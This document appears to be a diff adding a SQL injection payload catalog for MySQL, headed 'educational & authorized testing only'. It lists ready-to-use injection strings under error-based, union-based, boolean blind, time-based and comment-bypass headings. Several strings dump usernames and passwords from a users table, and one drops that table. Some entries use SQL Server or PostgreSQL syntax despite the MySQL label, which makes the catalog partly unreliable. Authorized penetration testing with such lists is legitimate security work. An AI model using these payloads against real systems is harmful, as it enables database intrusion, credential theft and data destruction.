@@ -1,0 +1,38 @@
+# SQL Injection Payload Catalog — MYSQL
+# Generated : 2026-02-20 18:30:04
+# Purpose   : Educational & authorized testing only
+
+
+## ERROR BASED
+1' AND 1=CONVERT(int, (SELECT @@version))--
+1' AND extractvalue(rand(), concat(0x3a, (SELECT user())))--
+1' AND updatexml(1, concat(0x3a, (SELECT database())), 1)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, (SELECT table_name FROM information_schema.tables LIMIT 1), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--
+1' AND ST_LatFromGeoHash((SELECT CONCAT(user, ':', password) FROM users LIMIT 1))--
+
+## UNION BASED
+1' UNION SELECT NULL, user(), version(), database()--
+1' UNION SELECT table_name, column_name, NULL, NULL FROM information_schema.columns WHERE table_schema=database()--
+1' UNION SELECT GROUP_CONCAT(table_name), GROUP_CONCAT(column_name), NULL, NULL FROM information_schema.columns WHERE table_schema=database()--
+1' UNION SELECT column_name, data_type, column_key, NULL FROM information_schema.columns WHERE table_name='users'--
+1' UNION SELECT username, password, email, NULL FROM users WHERE 1=1--
+
+## BOOLEAN BLIND
+1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--
+1' AND (SELECT LENGTH(user())) > 5--
+1' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%') > 0--
+1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 100 THEN 1 ELSE 0 END) = 1--
+
+## TIME BASED
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND IF((SELECT COUNT(*) FROM users) > 10, SLEEP(5), 0)--
+1' OR 1=1; WAITFOR DELAY '00:00:05'--
+1' AND (SELECT CASE WHEN (SUBSTRING(user(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+## COMMENT BYPASS
+1' OR '1'='1
+1' UNION SELECT NULL#
+1' UNION SELECT NULL,NULL/*
+1'; DROP TABLE users; --
+1' AND '1'='1' --
+1' OR '1'='1' /*
